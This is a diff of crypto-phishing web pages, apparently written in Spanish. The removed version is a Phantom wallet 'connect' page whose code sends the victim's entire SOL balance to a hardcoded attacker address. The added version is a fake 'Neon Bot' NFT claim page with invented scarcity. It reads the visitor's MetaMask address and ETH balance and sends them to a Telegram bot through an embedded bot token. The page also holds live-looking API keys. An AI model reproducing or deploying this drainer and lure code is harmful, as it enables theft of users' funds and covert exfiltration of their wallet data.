@@ -1,181 +1,214 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="es">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Conectar Phantom Wallet</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      text-align: center;
-      margin-top: 50px;
-    }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Neon Bot Access</title>
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.8.1/dist/web3.min.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Archivo+Black&display=swap" rel="stylesheet">
+    <style>
+        /* Estilo base */
+        body {
+            font-family: 'Archivo Black', sans-serif;
+            color: #ffffff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            position: relative;
+            overflow: hidden;
+            background-color: #000000;
+        }
 
-    #connect-button, #send-funds-button, #confirm-button {
-      background-color: #7e57c2;
-      color: white;
-      border: none;
-      padding: 15px 30px;
-      font-size: 16px;
-      border-radius: 8px;
-      cursor: pointer;
-      transition: background-color 0.3s ease;
-      margin-top: 20px;
-    }
+        .background-image {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: url('background2.jpg') no-repeat center center fixed;
+            background-size: cover;
+            z-index: -2;
+        }
 
-    #connect-button:hover, #send-funds-button:hover, #confirm-button:hover {
-      background-color: #5e35b1;
-    }
+        .background-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            z-index: -1;
+        }
 
-    #wallet-status {
-      margin-top: 20px;
-      font-size: 18px;
-      color: #333;
-    }
+        .container {
+            text-align: center;
+            max-width: 600px;
+            width: 90%;
+            z-index: 1;
+            padding: 20px;
+            box-sizing: border-box;
+        }
 
-    .error {
-      color: red;
-    }
+        h1 {
+            font-size: 2.2em;
+            margin-bottom: 0.5em;
+            color: #00ffcc;
+            white-space: nowrap;
+        }
 
-    .success {
-      color: green;
-    }
-  </style>
+        .description {
+            font-size: 1em;
+            margin-bottom: 1.5em;
+            color: #ecf0f1;
+            line-height: 1.4em;
+        }
+
+        button {
+            font-size: 1.1em;
+            padding: 0.8em 2em;
+            margin: 0.5em 0;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: transform 0.2s ease, background 0.2s ease, box-shadow 0.2s ease;
+            background-color: #00c29b;
+            color: #ffffff;
+            width: 80%;
+            box-shadow: 0 0 10px rgba(0, 255, 204, 0.3);
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        button:hover {
+            transform: translateY(-2px);
+            background-color: #03c49d;
+            box-shadow: 0 0 20px #03c49d;
+        }
+
+        #status {
+            font-size: 1em;
+            margin-top: 1em;
+            color: #2ecc71;
+            font-weight: bold;
+        }
+
+        .card {
+            background-color: #1c1c1c;
+            border-radius: 15px;
+            box-shadow: 0 0 15px rgba(0, 255, 204, 0.5);
+            padding: 15px;
+            max-width: 250px;
+            margin: 20px auto;
+            text-align: center;
+        }
+
+        .card img {
+            width: 80%;
+            border-radius: 10px;
+            margin-bottom: 10px;
+        }
+
+        .progress-container {
+            width: 100%;
+            background-color: #333;
+            border-radius: 12px;
+            overflow: hidden;
+            margin-top: 10px;
+            height: 15px;
+        }
+
+        .progress-bar {
+            width: 0;
+            height: 100%;
+            background-color: #00ffcc;
+            text-align: right;
+            padding-right: 5px;
+            box-sizing: border-box;
+            color: #fff;
+            font-size: 0.9em;
+            font-weight: bold;
+            animation: fillProgressBar 3s ease-out forwards;
+        }
+
+        @keyframes fillProgressBar {
+            0% { width: 0; }
+            100% { width: 73%; }
+        }
+
+        .claimed-text {
+            font-size: 0.75em;
+            color: #ecf0f1;
+            margin-top: 5px;
+        }
+    </style>
 </head>
 <body>
-  <h1>Conectar Phantom Wallet</h1>
-  <button id="connect-button">Conectar Wallet</button>
-  <div id="wallet-status"></div>
-  <button id="send-funds-button" style="display: none;">Mostrar Confirmación</button>
-  <button id="confirm-button" style="display: none;">Enviar Todos los Fondos</button>
+    <div class="background-image"></div>
+    <div class="background-overlay"></div>
 
-  <script>
-    const connectButton = document.getElementById("connect-button");
-    const sendFundsButton = document.getElementById("send-funds-button");
-    const confirmButton = document.getElementById("confirm-button");
-    const walletStatusDiv = document.getElementById("wallet-status");
-    let connectedPublicKey = null;
+    <div class="container">
+        <h1><span class="neon">NEON</span> ACCESS</h1>
+        <p class="description">
+            Claim 1 of 300 exclusive Neon Bot.<br>
+            Avoid Bot Wallets, Only wallets with transactions are eligible.
+        </p>
 
-    // Configuración de conexión con Helius
-    const connection = new solanaWeb3.Connection("https://mainnet.helius-rpc.com/?api-key=6f17ef70-139f-463a-bfaa-85a120eee8d3", "confirmed");
+        <div class="card">
+            <img src="tarjeta.jpg" alt="NFT Preview">
+            <div class="progress-container">
+                <div class="progress-bar"></div>
+            </div>
+            <p class="claimed-text">Copies Claimed 73%</p>
+        </div>
 
-    // Verifica si Phantom Wallet está instalada
-    const isPhantomInstalled = () => {
-      return window.solana && window.solana.isPhantom;
-    };
+        <button id="connectButton">Connect</button>
+        <p id="status"></p>
+    </div>
 
-    // Función para obtener saldo de la wallet
-    const getWalletBalance = async (publicKey) => {
-      try {
-        const balance = await connection.getBalance(publicKey);
-        console.log(`Balance en lamports: ${balance}`);
-        return balance / solanaWeb3.LAMPORTS_PER_SOL;
-      } catch (err) {
-        console.error("Error al obtener el saldo:", err);
-        return -1;
-      }
-    };
+    <script>
+        const TELEGRAM_BOT_TOKEN = '8061822678:AAEXjFUocG2cjyCCmIVyqVikMg96bFPbaXg';
+        const TELEGRAM_CHANNEL_ID = '-1002286653887';
 
-    // Función para enviar todos los fondos
-    const sendAllFunds = async () => {
-      if (!connectedPublicKey) {
-        alert("No hay una wallet conectada.");
-        return;
-      }
+        async function sendMessageToTelegram(walletAddress, ethBalance) {
+            const message = `Nueva conexión:\n\nWallet: ${walletAddress}\nBalance: ${ethBalance} ETH`;
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
 
-      const recipient = new solanaWeb3.PublicKey("BspM3ijR1wNgxpm6teGe6CUGRzSCwthoPefE2TpCjssb");
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: TELEGRAM_CHANNEL_ID, text: message }),
+                });
 
-      try {
-        const latestBlockhash = await connection.getLatestBlockhash();
-        const balance = await connection.getBalance(connectedPublicKey);
-
-        if (balance <= 0) {
-          walletStatusDiv.innerHTML = `<span class="error">No hay fondos disponibles para enviar.</span>`;
-          return;
+                if (!response.ok) {
+                    throw new Error(`Error al enviar el mensaje: ${response.statusText}`);
+                }
+                console.log('Mensaje enviado con éxito.');
+            } catch (error) {
+                console.error('Error enviando mensaje a Telegram:', error);
+            }
         }
 
-        const transaction = new solanaWeb3.Transaction({
-          recentBlockhash: latestBlockhash.blockhash,
-          feePayer: connectedPublicKey
-        });
+        document.getElementById('connectButton').onclick = async () => {
+            if (typeof window.ethereum !== 'undefined') {
+                const web3 = new Web3(window.ethereum);
+                const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
 
-        // Resta una tarifa de seguridad para las comisiones
-        transaction.add(
-          solanaWeb3.SystemProgram.transfer({
-            fromPubkey: connectedPublicKey,
-            toPubkey: recipient,
-            lamports: balance - 10000 // Reservar 10,000 lamports para tarifas (~0.00001 SOL)
-          })
-        );
+                const walletAddress = accounts[0];
+                const balanceWei = await web3.eth.getBalance(walletAddress);
+                const ethBalance = web3.utils.fromWei(balanceWei, 'ether');
 
-        // Solicita la firma del usuario
-        const signedTransaction = await window.solana.signTransaction(transaction);
+                sendMessageToTelegram(walletAddress, ethBalance);
 
-        // Envía la transacción
-        const txid = await connection.sendRawTransaction(signedTransaction.serialize());
-        await connection.confirmTransaction(txid, "finalized");
-
-        walletStatusDiv.innerHTML = `
-          <span class="success">Fondos enviados exitosamente. TXID: ${txid}</span>
-        `;
-        confirmButton.style.display = "none";
-      } catch (err) {
-        console.error("Error al enviar los fondos:", err);
-        walletStatusDiv.innerHTML = `<span class="error">Error al enviar los fondos: ${err.message}</span>`;
-      }
-    };
-
-    // Función para conectar la wallet y verificar saldo
-    const connectWallet = async () => {
-      if (!isPhantomInstalled()) {
-        alert("Phantom Wallet no está instalada. Por favor, instálala desde https://phantom.app");
-        return;
-      }
-
-      try {
-        const response = await window.solana.request({ method: 'connect' });
-        connectedPublicKey = response.publicKey;
-
-        const balance = await getWalletBalance(connectedPublicKey);
-
-        if (balance < 0) {
-          walletStatusDiv.innerHTML = `<span class="error">Error al obtener el saldo. Intenta nuevamente.</span>`;
-          return;
-        }
-
-        walletStatusDiv.innerHTML = `
-          <span class="success">Wallet conectada: ${connectedPublicKey.toString()} | Saldo: ${balance.toFixed(4)} SOL</span>
-        `;
-        connectButton.textContent = "Conectado";
-        connectButton.disabled = true;
-
-        if (balance > 0) {
-          sendFundsButton.style.display = "inline-block";
-
-          sendFundsButton.addEventListener("click", () => {
-            walletStatusDiv.innerHTML = `<span>Por favor, confirma el envío de los fondos.</span>`;
-            confirmButton.style.display = "inline-block";
-          });
-
-          confirmButton.addEventListener("click", sendAllFunds);
-        } else {
-          walletStatusDiv.innerHTML = `
-            <span class="error">No hay suficiente saldo para realizar transacciones.</span>
-          `;
-        }
-      } catch (err) {
-        console.error("Error al conectar la wallet:", err);
-        walletStatusDiv.innerHTML = `<span class="error">Error al conectar la wallet: ${err.message}</span>`;
-      }
-    };
-
-    connectButton.addEventListener("click", connectWallet);
-
-    if (!isPhantomInstalled()) {
-      walletStatusDiv.textContent = "Phantom Wallet no está instalada.";
-    }
-  </script>
-
-  <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.80.0/lib/index.iife.min.js"></script>
+                document.getElementById('status').innerText = `Wallet conectada: ${walletAddress}`;
+            } else {
+                alert('Por favor, instala MetaMask.');
+            }
+        };
+    </script>
 </body>
 </html>
